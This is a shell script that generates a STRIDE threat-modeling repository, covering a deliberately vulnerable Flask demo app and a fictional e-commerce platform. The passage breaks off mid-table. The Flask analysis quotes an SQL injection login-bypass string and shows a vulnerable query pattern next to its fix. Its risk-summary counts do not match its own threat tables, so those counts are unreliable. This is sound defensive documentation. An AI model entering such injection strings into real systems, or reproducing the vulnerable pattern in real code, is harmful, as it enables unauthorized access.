#!/bin/bash
# Setup script for the threat-modeling GitHub repository.
# Run this from the directory where you want the repo created.
#
# Usage:
#   chmod +x setup-threat-modeling-repo.sh
#   ./setup-threat-modeling-repo.sh
#
# After running, push to GitHub:
#   cd threat-modeling
#   gh repo create threat-modeling --public --source . --push
#
# Or manually:
#   cd threat-modeling
#   git remote add origin git@github.com:YOUR_USERNAME/threat-modeling.git
#   git push -u origin main

set -euo pipefail

REPO_DIR="threat-modeling"

if [ -d "$REPO_DIR" ]; then
    echo "Error: Directory '$REPO_DIR' already exists. Remove it or run from a different location."
    exit 1
fi

echo "Creating threat-modeling repository..."

mkdir -p "$REPO_DIR"/{methodology,templates,models/{flask-demo-app,enterprise-ecommerce,ci-cd-pipeline}}

# ────────────────────────────────────────────
# Root README
# ────────────────────────────────────────────

cat > "$REPO_DIR/README.md" << 'ENDOFFILE'
# Threat Modeling Portfolio

Structured threat models for three systems at different scales, built using the STRIDE methodology. Each model includes architecture documentation, data flow diagrams with trust boundaries, systematic threat enumeration, risk ratings, and mapped mitigations.

## Models

| Model | Target | Key Threat Surfaces |
|-------|--------|-------------------|
| [Flask Demo App](models/flask-demo-app/) | Intentionally vulnerable Python web app | SQL injection, XSS, hardcoded secrets, insecure deserialization |
| [Enterprise E-Commerce Platform](models/enterprise-ecommerce/) | Multi-tier retail platform (SecureCart) | Payment processing, PII handling, API security, third-party integrations |
| [CI/CD Pipeline](models/ci-cd-pipeline/) | GitHub Actions DevSecOps pipeline | Supply chain attacks, secrets exfiltration, runner compromise, dependency poisoning |

## Methodology

All models follow the [STRIDE framework](methodology/stride-framework.md) with a consistent risk rating system. A reusable [threat model template](templates/threat-model-template.md) is included for applying the same process to new systems.

## How to Read These Models

Each model directory contains:

- **README.md** — System overview and architecture description
- **data-flow-diagram.md** — Mermaid DFDs with labeled trust boundaries
- **threat-analysis.md** — STRIDE threats enumerated per component with risk ratings
- **mitigations.md** — Controls mapped to each identified threat

## Related Projects

- [devsecops-pipeline-demo](https://github.com/adamtamenne/devsecops-pipeline-demo) — The working 5-stage security pipeline that the Flask app and CI/CD pipeline models reference
ENDOFFILE

echo "  ✓ Root README"

# ────────────────────────────────────────────
# Methodology
# ────────────────────────────────────────────

cat > "$REPO_DIR/methodology/stride-framework.md" << 'ENDOFFILE'
# STRIDE Threat Modeling Framework

## Overview

STRIDE is a threat classification model developed at Microsoft for systematically identifying security threats in software systems. Each letter represents a category of threat that maps to a security property being violated.

## STRIDE Categories

| Category | Security Property Violated | Question to Ask |
|----------|---------------------------|----------------|
| **S**poofing | Authentication | Can an attacker pretend to be someone or something else? |
| **T**ampering | Integrity | Can an attacker modify data they shouldn't? |
| **R**epudiation | Non-repudiation | Can an attacker deny performing an action? |
| **I**nformation Disclosure | Confidentiality | Can an attacker access data they shouldn't see? |
| **D**enial of Service | Availability | Can an attacker prevent legitimate use of the system? |
| **E**levation of Privilege | Authorization | Can an attacker gain access beyond what they're allowed? |

## Process

### Step 1: Define the System
Document the system architecture, components, data stores, and external entities. Identify the data classification for each type of information the system handles.

### Step 2: Create Data Flow Diagrams
Build DFDs at appropriate levels of detail (Level 0 for context, Level 1 for component interaction). Identify and label trust boundaries — every point where data crosses a trust boundary is a potential attack surface.

### Step 3: Enumerate Threats
Walk through each component and data flow. For each one, ask the six STRIDE questions. Document each identified threat with:
- A unique identifier
- The affected component
- A description of the attack scenario
- A risk rating

### Step 4: Rate Risk
Assess each threat using a likelihood × impact matrix:

| | Low Impact | Medium Impact | High Impact |
|---|-----------|--------------|-------------|
| **High Likelihood** | Medium | High | Critical |
| **Medium Likelihood** | Low | Medium | High |
| **Low Likelihood** | Low | Low | Medium |

### Step 5: Define Mitigations
For each threat, identify one or more controls that reduce the risk. Map mitigations to threats to ensure complete coverage. Identify any residual risk that remains after mitigations are applied.

## When to Use STRIDE

STRIDE works well for:
- Established systems with defined architectures
- Systems handling sensitive data (PII, financial, health)
- Compliance-driven environments (PCI, HIPAA, SOC 2)
- Teams new to threat modeling (the six categories provide structure)

## References

- [Microsoft STRIDE documentation](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats)
- [OWASP Threat Modeling](https://owasp.org/www-community/Threat_Modeling)
ENDOFFILE

echo "  ✓ Methodology"

# ────────────────────────────────────────────
# Template
# ────────────────────────────────────────────

cat > "$REPO_DIR/templates/threat-model-template.md" << 'ENDOFFILE'
# Threat Model: [System Name]

**System:** [Brief description]
**Date:** [Date]
**Methodology:** STRIDE

## System Overview

[Describe the system: what it does, who uses it, what data it handles.]

### Architecture

| Component | Technology | Description |
|-----------|-----------|-------------|
| | | |

### Data Classification

| Data Type | Classification | Regulatory Scope | Storage |
|-----------|---------------|-----------------|---------|
| | | | |

## Data Flow Diagram

[Include Mermaid DFDs at Level 0 and Level 1. Label all trust boundaries.]

### Trust Boundaries

| Boundary | Components Inside | Rationale |
|----------|------------------|-----------|
| | | |

### Critical Data Flows

| # | Flow | Source | Destination | Data | Trust Boundary Crossing |
|---|------|--------|-------------|------|------------------------|
| | | | | | |

## STRIDE Threat Analysis

### Spoofing

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| S-1 | | | | |

### Tampering

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| T-1 | | | | |

### Repudiation

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| R-1 | | | | |

### Information Disclosure

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| I-1 | | | | |

### Denial of Service

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| D-1 | | | | |

### Elevation of Privilege

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| E-1 | | | | |

## Risk Summary

| Risk Level | Count | Key Items |
|-----------|-------|-----------|
| Critical | | |
| High | | |
| Medium | | |
| Low | | |

## Mitigations

[List mitigations with IDs, grouped by priority or layer. Map each to the threats it addresses.]

## Assumptions and Out-of-Scope Items

- [List assumptions made during the analysis]
- [List items intentionally excluded and why]
ENDOFFILE

echo "  ✓ Template"

# ────────────────────────────────────────────
# Flask Demo App
# ────────────────────────────────────────────

cat > "$REPO_DIR/models/flask-demo-app/README.md" << 'ENDOFFILE'
# Threat Model: Flask Demo Application

**System:** Intentionally vulnerable Python/Flask web application
**Date:** October 2026
**Methodology:** STRIDE

## System Overview

This threat model covers a deliberately vulnerable Flask application used for security scanning demonstrations. The application contains common web application vulnerabilities (SQL injection, insecure deserialization, hardcoded secrets) and is packaged as a Docker container. It serves as the target application for a DevSecOps pipeline that scans it across five security stages.

### Architecture

| Component | Technology | Description |
|-----------|-----------|-------------|
| Web Application | Python / Flask | Handles HTTP requests, renders templates, processes user input |
| Database | SQLite | Stores user accounts and application data in a local file |
| Container Runtime | Docker | Packages the app with a Debian-based Python image |
| Dependencies | pip / requirements.txt | Third-party Python packages (some with known CVEs) |

### Data Classification

| Data Type | Classification | Storage |
|-----------|---------------|---------|
| User credentials | Secret | SQLite (plaintext — intentionally insecure) |
| Stripe API key | Secret | Hardcoded in source (intentionally insecure) |
| Session tokens | Confidential | Flask signed cookies |
| User input | Untrusted | Passed directly to SQL queries (intentionally insecure) |
| Application source code | Internal | GitHub repository |

### Known Intentional Vulnerabilities

This is a demo application. The following vulnerabilities exist by design and are detected by the DevSecOps pipeline:

- SQL injection via string concatenation in queries
- Hardcoded Stripe API key in source code
- Plaintext password storage (no hashing)
- Insecure deserialization via `pickle.loads()` on user input
- Debug mode enabled in production
- Container runs as root
- Missing security headers
- Vulnerable third-party dependencies
ENDOFFILE

cat > "$REPO_DIR/models/flask-demo-app/data-flow-diagram.md" << 'ENDOFFILE'
# Data Flow Diagrams: Flask Demo Application

## Level 0 — Context Diagram

```mermaid
flowchart LR
    User([User / Attacker])
    App[Flask Demo App]
    Scanner([Security Scanner])

    User -->|HTTP requests| App
    App -->|HTML responses| User
    Scanner -->|Automated requests\nSAST / DAST| App
```

## Level 1 — Component Diagram with Trust Boundaries

```mermaid
flowchart TB
    subgraph TB_Internet["Trust Boundary: Internet (Untrusted)"]
        User([User / Browser])
    end

    subgraph TB_Container["Trust Boundary: Docker Container"]
        Flask[Flask Application\nPython]
        Templates[Jinja2 Templates]
        Pickle[Pickle Deserializer]
        SQLite[(SQLite Database)]
        StaticFiles[Static Files]
    end

    User -->|HTTP request\nuntrusted input| Flask
    Flask -->|Render HTML| Templates
    Templates -->|HTML response| User
    Flask -->|SQL query\nstring concatenation| SQLite
    SQLite -->|Query results| Flask
    Flask -->|pickle.loads\nuntrusted data| Pickle
    Flask -->|Serve| StaticFiles
    StaticFiles -->|CSS, JS| User
```

## Trust Boundaries

| Boundary | Components Inside | Rationale |
|----------|------------------|-----------|
| Internet | User browsers, automated scanners | Fully untrusted. All input must be validated. |
| Docker Container | Flask app, SQLite, templates, static files | Single trust zone — all components run as root in the same container with no internal isolation. |

## Critical Data Flows

| # | Flow | Source | Destination | Data | Trust Boundary Crossing |
|---|------|--------|-------------|------|------------------------|
| DF-1 | User login | Browser | Flask app | Username + plaintext password | Internet → Container |
| DF-2 | Search query | Browser | SQLite (via Flask) | User-supplied search string | Internet → Container |
| DF-3 | Deserialization | Browser | Pickle module (via Flask) | Base64-encoded pickle payload | Internet → Container |
| DF-4 | Page render | Flask app | Browser | HTML with user-controlled data | Container → Internet |
| DF-5 | Session cookie | Flask app | Browser | Signed session cookie | Container → Internet |
ENDOFFILE

cat > "$REPO_DIR/models/flask-demo-app/threat-analysis.md" << 'ENDOFFILE'
# STRIDE Threat Analysis: Flask Demo Application

## Spoofing

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| S-1 | Login endpoint | Brute force attack against the login form. No rate limiting or account lockout. | High | Rate limit login attempts. Implement progressive delays or CAPTCHA after failed attempts. |
| S-2 | Session management | Session hijacking via cookie theft. Flask's `SECRET_KEY` is weak or predictable, allowing an attacker to forge session cookies. | High | Generate a cryptographically random `SECRET_KEY`. Set `Secure`, `HttpOnly`, and `SameSite` flags on cookies. |
| S-3 | Authentication | Attacker uses SQL injection in the login query to bypass authentication entirely (e.g. `' OR 1=1 --`). | Critical | Parameterize all SQL queries. Hash passwords with bcrypt. |

## Tampering

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| T-1 | Database queries | SQL injection allows an attacker to modify, insert, or delete database records by injecting SQL via user input fields. | Critical | Use parameterized queries or an ORM. Never concatenate user input into SQL strings. |
| T-2 | Pickle deserializer | Attacker sends a crafted pickle payload that executes arbitrary code on the server when deserialized via `pickle.loads()`. | Critical | Remove pickle deserialization of untrusted input. Use JSON with schema validation instead. |
| T-3 | SQLite database | The SQLite database file can be corrupted or modified if the container filesystem is compromised, or if a second vulnerability grants file write access. | Low | Use a production database engine (PostgreSQL, MySQL) with authentication and network-level access controls. |

## Repudiation

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| R-1 | Application | No logging of authentication events or user actions. An attacker can perform actions with no audit trail. | Medium | Implement structured logging for all authentication events, failed login attempts, and data-modifying operations. |
| R-2 | Admin functions | If admin functionality exists, actions are not attributed to specific users and cannot be traced. | Medium | Log admin actions with authenticated identity, timestamp, and action details. Implement role-based access control. |

## Information Disclosure

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| I-1 | Source code | Hardcoded Stripe API key (`sk_live_...`) in the application source. Anyone with repository access (or who decompiles the container image) obtains a live payment API key. | Critical | Move secrets to environment variables. Add `.env` to `.gitignore`. Rotate the exposed key immediately. |
| I-2 | Error handling | Flask debug mode (`debug=True`) is enabled. Unhandled exceptions show the Werkzeug debugger with full stack traces, source code, and an interactive Python console. | Critical | Disable debug mode in production. Implement custom error handlers that return generic messages. |
| I-3 | Database | Passwords stored in plaintext in SQLite. Any database compromise (SQL injection, file access) immediately reveals all user passwords. | High | Hash passwords using bcrypt with a work factor ≥ 12. Never store or compare plaintext passwords. |
| I-4 | HTTP headers | Missing security headers (`X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`). Increases risk of XSS, clickjacking, and MIME sniffing attacks. | Medium | Add security headers via `flask-talisman` or response middleware. |

## Denial of Service

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| D-1 | Login endpoint | No rate limiting allows an attacker to flood the login endpoint with requests, exhausting server resources. | Medium | Use `flask-limiter` to throttle requests per IP. |
| D-2 | Pickle deserializer | A crafted pickle payload can trigger resource exhaustion (e.g. allocating large objects, infinite loops) in addition to code execution. | High | Remove pickle deserialization entirely. |
| D-3 | SQLite | SQLite does not handle concurrent write operations well. Heavy write traffic can lock the database and block all reads. | Medium | Use a production database engine designed for concurrent access. |

## Elevation of Privilege

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| E-1 | Pickle deserializer | Arbitrary code execution via pickle deserialization gives the attacker the same privileges as the Flask process — which runs as root in the container. Full container compromise. | Critical | Remove pickle. Run the container as a non-root user. |
| E-2 | Docker container | The container runs as root. If an attacker achieves code execution (via pickle, command injection, or a dependency vulnerability), they have full root access inside the container. | High | Add a `USER` directive to the Dockerfile. Run as a non-root user. |
| E-3 | Database | SQL injection enables reading or modifying any table in the SQLite database, including any admin or role tables, potentially escalating from a regular user to admin. | High | Parameterize queries. Use a database with per-user permissions and least-privilege grants. |

## Risk Summary

| Risk Level | Count | Key Items |
|-----------|-------|-----------|
| Critical | 5 | SQL injection auth bypass, pickle RCE, hardcoded API key, debug mode, pickle privilege escalation |
| High | 4 | Brute force, session hijacking, plaintext passwords, root container |
| Medium | 5 | No logging, missing headers, login DoS, SQLite concurrency, SQL injection escalation |
| Low | 1 | SQLite file tampering |
ENDOFFILE

cat > "$REPO_DIR/models/flask-demo-app/mitigations.md" << 'ENDOFFILE'
# Mitigations: Flask Demo Application

Controls mapped to identified threats, ordered by priority. Each mitigation references the threat IDs it addresses.

## Priority 1 — Critical Risk

### M-1: Parameterize all SQL queries
**Addresses:** T-1, S-3, E-3
**Implementation:** Replace string concatenation with parameterized queries using `?` placeholders or SQLAlchemy ORM.

```python
# Vulnerable
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")

# Fixed
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

### M-2: Remove pickle deserialization of untrusted input
**Addresses:** T-2, D-2, E-1
**Implementation:** Replace `pickle.loads()` with JSON parsing. If serialization is required, use a safe format with schema validation.

### M-3: Move secrets to environment variables
**Addresses:** I-1
**Implementation:** Remove hardcoded Stripe key from source. Load from environment at runtime. Add `.env` to `.gitignore`. Rotate the exposed key.

```python
# Vulnerable
STRIPE_KEY = "sk_live_..."

# Fixed
STRIPE_KEY = os.environ.get("STRIPE_KEY")
```

### M-4: Hash passwords
**Addresses:** I-3, S-3
**Implementation:** Use bcrypt with a work factor of at least 12. Never store or compare plaintext passwords.

```python
from bcrypt import hashpw, gensalt, checkpw
hashed = hashpw(password.encode(), gensalt(rounds=12))
```

## Priority 2 — High Risk

### M-5: Secure session configuration
**Addresses:** S-2
**Implementation:** Generate a cryptographically random `SECRET_KEY`, set cookie flags.

```python
app.config['SECRET_KEY'] = os.urandom(32)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

### M-6: Add rate limiting
**Addresses:** S-1, D-1
**Implementation:** Use `flask-limiter` to throttle login attempts and API endpoints.

```python
from flask_limiter import Limiter
limiter = Limiter(app, default_limits=["100 per minute"])

@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute")
def login():
    ...
```

### M-7: Run container as non-root
**Addresses:** E-2
**Implementation:** Add a `USER` directive to the Dockerfile.

```dockerfile
RUN adduser --disabled-password --no-create-home appuser
USER appuser
```

### M-8: Disable debug mode and add custom error handlers
**Addresses:** I-2
**Implementation:** Ensure `debug=False` in production. Return generic error pages.

## Priority 3 — Medium Risk

### M-9: Add security headers
**Addresses:** I-4
**Implementation:** Use `flask-talisman` or add headers via middleware.

```python
from flask_talisman import Talisman
Talisman(app, content_security_policy={...})
```

### M-10: Implement structured logging
**Addresses:** R-1, R-2
**Implementation:** Log authentication events, data access, and errors in a structured format (JSON). Ship to a centralized logging system.

### M-11: Use a production database engine
**Addresses:** T-3, D-3
**Implementation:** Replace SQLite with PostgreSQL or MySQL. Configure authentication and restrict network access to the database.

## Control Coverage Matrix

| Threat | Mitigation | Status |
|--------|-----------|--------|
| S-1 | M-6 (Rate limiting) | Not implemented (demo) |
| S-2 | M-5 (Session config) | Not implemented (demo) |
| S-3 | M-1, M-4 (Parameterized queries, password hashing) | Not implemented (demo) |
| T-1 | M-1 (Parameterized queries) | Not implemented (demo) |
| T-2 | M-2 (Remove pickle) | Not implemented (demo) |
| T-3 | M-11 (Production DB) | Not implemented (demo) |
| R-1 | M-10 (Logging) | Not implemented (demo) |
| R-2 | M-10 (Logging + RBAC) | Not implemented (demo) |
| I-1 | M-3 (Env vars) | Not implemented (demo) |
| I-2 | M-8 (Debug off) | Not implemented (demo) |
| I-3 | M-4 (Bcrypt) | Not implemented (demo) |
| I-4 | M-9 (Security headers) | Not implemented (demo) |
| D-1 | M-6 (Rate limiting) | Not implemented (demo) |
| D-2 | M-2 (Remove pickle) | Not implemented (demo) |
| D-3 | M-11 (Production DB) | Not implemented (demo) |
| E-1 | M-2 (Remove pickle) | Not implemented (demo) |
| E-2 | M-7 (Non-root container) | Not implemented (demo) |
| E-3 | M-1 (Parameterized queries) | Not implemented (demo) |

All mitigations are intentionally not implemented because the application is designed to be vulnerable for security scanning demonstrations. In a production system, Priority 1 mitigations would be mandatory before deployment.
ENDOFFILE

echo "  ✓ Flask Demo App model"

# ────────────────────────────────────────────
# Enterprise E-Commerce
# ────────────────────────────────────────────

cat > "$REPO_DIR/models/enterprise-ecommerce/README.md" << 'ENDOFFILE'
# Threat Model: SecureCart E-Commerce Platform

**System:** Fictional multi-tier enterprise e-commerce platform
**Date:** October 2026
**Methodology:** STRIDE

## System Overview

SecureCart is a cloud-hosted e-commerce platform processing credit card transactions, managing customer PII, and integrating with third-party services. This threat model covers the production architecture as it would exist for a mid-market retailer handling ~50,000 transactions per month.

### Architecture

| Component | Technology | Description |
|-----------|-----------|-------------|
| Web Frontend | React SPA | Customer-facing storefront served via CDN |
| API Gateway | Kong / AWS API Gateway | Routes requests, enforces rate limits, terminates TLS |
| Auth Service | OAuth 2.0 / OpenID Connect | Issues JWTs, manages user sessions, integrates with IdP |
| Product Service | Node.js | Product catalog, search, inventory management |
| Order Service | Python | Order processing, cart management, order history |
| Payment Service | Java | PCI-scoped payment processing, interfaces with Stripe/payment processor |
| Notification Service | Python | Email confirmations, SMS alerts, marketing (via SendGrid/Twilio) |
| Primary Database | PostgreSQL (RDS) | Customer data, orders, product catalog |
| Cache Layer | Redis | Session cache, product catalog cache, rate limit counters |
| Message Queue | RabbitMQ / SQS | Async order processing, notification dispatch |
| Object Storage | S3 | Product images, invoices, export files |
| CDN | CloudFront | Static asset delivery, DDoS absorption |
| Monitoring | Datadog / CloudWatch | Metrics, logs, alerting |

### Data Classification

| Data Type | Classification | Regulatory Scope | Storage |
|-----------|---------------|-----------------|---------|
| Cardholder data (PAN, CVV) | Restricted | PCI DSS | Never stored; tokenized at payment processor |
| Customer PII (name, email, address) | Confidential | GDPR, CCPA | PostgreSQL (encrypted at rest) |
| Authentication credentials | Secret | SOC 2 | Hashed in PostgreSQL, JWTs in Redis |
| Order history | Internal | GDPR (right to erasure) | PostgreSQL |
| Product catalog | Public | None | PostgreSQL, Redis cache |
| Session tokens | Confidential | SOC 2 | Redis (TTL-scoped) |
| API keys (internal service-to-service) | Secret | SOC 2 | Secrets manager (AWS SSM / Vault) |

### Compliance Requirements

- **PCI DSS**: Payment Service is the only component in PCI scope. Cardholder data never touches other services; the Payment Service calls Stripe's tokenization API and stores only the token.
- **GDPR/CCPA**: Customer PII must support right-to-access and right-to-erasure requests. Data retention policies enforce automatic deletion after account closure.
- **SOC 2**: Audit logging, access controls, and encryption requirements apply to all services.
ENDOFFILE

cat > "$REPO_DIR/models/enterprise-ecommerce/data-flow-diagram.md" << 'ENDOFFILE'
# Data Flow Diagrams: SecureCart E-Commerce Platform

## Level 0 — Context Diagram

```mermaid
flowchart LR
    Customer([Customer])
    Admin([Admin User])
    Platform[SecureCart Platform]
    PayProc([Payment Processor\nStripe])
    Email([Email/SMS Provider\nSendGrid/Twilio])
    IdP([Identity Provider\nOkta/Entra])

    Customer -->|Browse, purchase,\naccount mgmt| Platform
    Platform -->|Order confirmations,\nreceipts, alerts| Customer
    Admin -->|Product mgmt,\norder review, config| Platform
    Platform <-->|Tokenize cards,\nprocess charges| PayProc
    Platform -->|Send notifications| Email
    Platform <-->|SSO authentication| IdP
```

## Level 1 — Service Diagram with Trust Boundaries

```mermaid
flowchart TB
    subgraph TB_Internet["Trust Boundary: Internet (Untrusted)"]
        Customer([Customer Browser])
        Admin([Admin Browser])
    end

    subgraph TB_Edge["Trust Boundary: Edge / DMZ"]
        CDN[CDN\nCloudFront]
        Gateway[API Gateway\nKong]
    end

    subgraph TB_App["Trust Boundary: Application Services (VPC)"]
        Auth[Auth Service]
        Product[Product Service]
        Order[Order Service]
        Notify[Notification Service]
    end

    subgraph TB_PCI["Trust Boundary: PCI Scope (Isolated Subnet)"]
        Payment[Payment Service]
    end

    subgraph TB_Data["Trust Boundary: Data Layer (Private Subnet)"]
        DB[(PostgreSQL)]
        Cache[(Redis)]
        Queue[(Message Queue)]
        Storage[(S3 Bucket)]
    end

    subgraph TB_External["Trust Boundary: Third-Party Services"]
        Stripe([Stripe API])
        SendGrid([SendGrid])
        IdP([Identity Provider])
    end

    Customer -->|HTTPS| CDN
    CDN -->|Static assets| Customer
    Customer -->|HTTPS /api/*| Gateway
    Admin -->|HTTPS /admin/*| Gateway

    Gateway -->|JWT validation| Auth
    Gateway -->|Product queries| Product
    Gateway -->|Order operations| Order

    Auth <-->|OIDC/SAML| IdP
    Auth -->|Session write| Cache
    Product -->|Catalog queries| DB
    Product -->|Cache read/write| Cache
    Order -->|Order CRUD| DB
    Order -->|Payment request| Payment
    Order -->|Queue notification| Queue
    Queue -->|Dequeue| Notify
    Notify -->|Send email/SMS| SendGrid
    Payment -->|Tokenize + charge| Stripe
    Payment -->|Store token ref| DB
    Order -->|Store invoice| Storage
```

## Trust Boundaries

| Boundary | Components Inside | Rationale |
|----------|------------------|-----------|
| Internet | Customer browsers, admin browsers | Fully untrusted. All input requires validation. |
| Edge / DMZ | CDN, API Gateway | First layer of defense. TLS termination, rate limiting, request filtering. |
| Application Services | Auth, Product, Order, Notification services | Internal services communicating over private network. Trusted but authenticated. |
| PCI Scope | Payment Service | Isolated subnet with restricted network ACLs. Only the Order Service can reach it. Subject to PCI DSS controls. |
| Data Layer | PostgreSQL, Redis, S3, Message Queue | No direct internet access. Accessible only from Application and PCI subnets. |
| Third-Party | Stripe, SendGrid, IdP | External services accessed over TLS. Require API key management and response validation. |

## Critical Data Flows

| # | Flow | Source | Destination | Data | Trust Boundary Crossing |
|---|------|--------|-------------|------|------------------------|
| DF-1 | Customer login | Browser | Auth Service | Credentials or OIDC token | Internet → Edge → App |
| DF-2 | Product search | Browser | Product Service | Search query | Internet → Edge → App |
| DF-3 | Place order | Browser | Order Service | Cart contents, shipping address | Internet → Edge → App |
| DF-4 | Payment request | Order Service | Payment Service | Order total, customer token ref | App → PCI |
| DF-5 | Card tokenization | Payment Service | Stripe | Card details (ephemeral) | PCI → External |
| DF-6 | Order notification | Queue | Notification Service | Order details, customer email | Data → App |
| DF-7 | Admin product update | Admin browser | Product Service | Product data, images | Internet → Edge → App |
| DF-8 | Invoice storage | Order Service | S3 | PDF invoice with PII | App → Data |
| DF-9 | Session lookup | API Gateway | Redis | JWT / session ID | Edge → Data |
ENDOFFILE

cat > "$REPO_DIR/models/enterprise-ecommerce/threat-analysis.md" << 'ENDOFFILE'
# STRIDE Threat Analysis: SecureCart E-Commerce Platform

## Spoofing

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| S-1 | Auth Service | Credential stuffing using breached credential lists against the login endpoint. | High | Rate limit login attempts per IP and per account. Require MFA for all accounts. Monitor for credential stuffing patterns (high failure rate from distributed IPs). |
| S-2 | API Gateway | Forged or expired JWT accepted by the gateway. Attacker replays a stolen token to impersonate a user. | High | Short JWT expiry (15 min access, 7 day refresh). Validate `exp`, `iss`, `aud` claims on every request. Implement token revocation via a deny-list in Redis. |
| S-3 | Admin endpoints | Attacker gains access to admin panel via compromised admin credentials. No MFA required. | Critical | Enforce MFA for all admin accounts. Restrict admin access to VPN or allowlisted IPs. Log all admin actions. |
| S-4 | Service-to-service | Attacker on the internal network impersonates a service (e.g. spoofs Order Service to call Payment Service). | Medium | Mutual TLS (mTLS) between services. Service identity via short-lived certificates from a service mesh (Istio/Linkerd). |
| S-5 | IdP integration | Attacker compromises the SAML/OIDC response. XML signature wrapping or token substitution. | Medium | Validate SAML signatures against pinned IdP certificate. Verify `aud` and `iss` in OIDC tokens. |

## Tampering

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| T-1 | Order Service | Attacker modifies order total (price manipulation) by intercepting or replaying the request with a changed amount. | Critical | Server-side price calculation from the product catalog. Never trust client-submitted prices. Compare submitted total against server-calculated total before processing. |
| T-2 | API Gateway | Attacker modifies request body in transit (man-in-the-middle). | High | TLS 1.2+ enforced on all endpoints. HSTS headers with long max-age. Certificate pinning on mobile clients. |
| T-3 | S3 bucket | Attacker modifies stored invoices or product images. Bucket policy misconfiguration allows public write. | High | Restrict S3 bucket policies to least-privilege. Enable versioning and access logging. Block public access at the account level. |
| T-4 | Redis cache | Attacker with network access poisons the product catalog cache, displaying incorrect prices or injecting XSS payloads. | Medium | Require authentication for Redis connections (AUTH). Restrict network access to application subnet only. Validate data read from cache before rendering. |
| T-5 | Message Queue | Attacker injects a fraudulent order confirmation message into the queue, triggering a fake notification. | Medium | Authenticate queue producers. Sign messages with HMAC so consumers can verify origin. |

## Repudiation

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| R-1 | Order Service | Customer disputes a charge, claiming they never placed the order. No audit trail linking the authenticated session to the order. | High | Log the full request chain: authenticated user ID, session ID, IP, timestamp, and order details. Store logs immutably (append-only, shipped to a centralized system). |
| R-2 | Admin endpoints | Admin user modifies product prices or deletes orders with no attribution. | High | Log all admin write operations with authenticated identity, timestamp, and before/after state. Require approval workflows for destructive operations. |
| R-3 | Payment Service | Dispute over whether a refund was processed. | Medium | Log all payment operations (charge, refund, void) with Stripe transaction IDs. Reconcile nightly against Stripe's records. |

## Information Disclosure

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| I-1 | API responses | API returns more fields than the client needs (over-fetching). Internal IDs, email addresses of other users, or staff notes leak via verbose responses. | High | Implement response serializers per endpoint. Never return raw database objects. Review API responses for PII leakage. |
| I-2 | S3 bucket | Misconfigured bucket policy exposes invoices (containing customer PII and order details) to the internet. | Critical | Block public access at the S3 account level. Use pre-signed URLs with short TTLs for authorized access. Enable CloudTrail logging for S3 data events. |
| I-3 | Error handling | Unhandled exceptions return stack traces to the client, revealing internal paths, database schema, and dependency versions. | Medium | Implement global error handlers that return generic messages. Log full details server-side only. |
| I-4 | Redis | Redis instance accessible without authentication. An attacker on the VPC can dump session tokens and cached PII. | High | Enable Redis AUTH. Use TLS for Redis connections. Restrict security group to application subnet. |
| I-5 | Logs | PII (email, address) or secrets (API keys) logged in plaintext. Log aggregation system exposes them to operations staff. | Medium | Scrub PII from logs before shipping. Never log secrets, tokens, or card data. Use structured logging with a PII filter. |
| I-6 | Database | PostgreSQL data not encrypted at rest. A stolen EBS snapshot exposes all customer data. | High | Enable encryption at rest (RDS default encryption). Use customer-managed KMS keys. Restrict snapshot sharing. |

## Denial of Service

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| D-1 | API Gateway | Volumetric DDoS against API endpoints overwhelms the gateway and backend services. | High | CDN-layer DDoS mitigation (CloudFront, AWS Shield). API Gateway rate limiting per IP and per API key. Auto-scaling for backend services. |
| D-2 | Product search | Attacker sends expensive search queries (regex injection, wildcard abuse) that overload the database. | Medium | Validate and sanitize search input. Set query timeouts. Use a search index (Elasticsearch) instead of database LIKE queries. |
| D-3 | Auth Service | Account lockout abuse: attacker intentionally fails login for legitimate users, locking them out. | Medium | Progressive delays instead of hard lockout. CAPTCHA after N failures. Notify user of failed attempts. |
| D-4 | Message Queue | Attacker floods the queue with messages, exhausting consumer resources and delaying legitimate notifications. | Medium | Queue depth limits. Dead-letter queue for poison messages. Authenticate queue producers. |

## Elevation of Privilege

| # | Component | Threat | Risk | Mitigation |
|---|-----------|--------|------|------------|
| E-1 | API Gateway | Broken access control: user A accesses user B's orders by changing the order ID in the URL (IDOR). | Critical | Validate resource ownership on every request. Never rely solely on the client to enforce access. Check `user_id` matches the authenticated session for every data access. |
| E-2 | Auth Service | JWT claim manipulation: attacker modifies the `role` claim in a JWT to escalate from `customer` to `admin`. | Critical | Sign JWTs with RS256 (asymmetric). Validate signature on every request. Never use `alg: none`. Store role assignments server-side, not solely in the token. |
| E-3 | Payment Service | Attacker exploits an SSRF in another service to reach the Payment Service, which is supposed to be accessible only from the Order Service. | High | Network-level isolation: security groups restrict inbound to Payment Service to Order Service IP only. Implement SSRF protections (block internal IP ranges in outbound HTTP calls). |
| E-4 | Database | SQL injection in any service grants the attacker database-level access, potentially including cross-schema access to other services' data. | High | Parameterized queries everywhere. Database user per service with least-privilege grants (service A cannot read service B's tables). |

## Risk Summary

| Risk Level | Count | Key Items |
|-----------|-------|-----------|
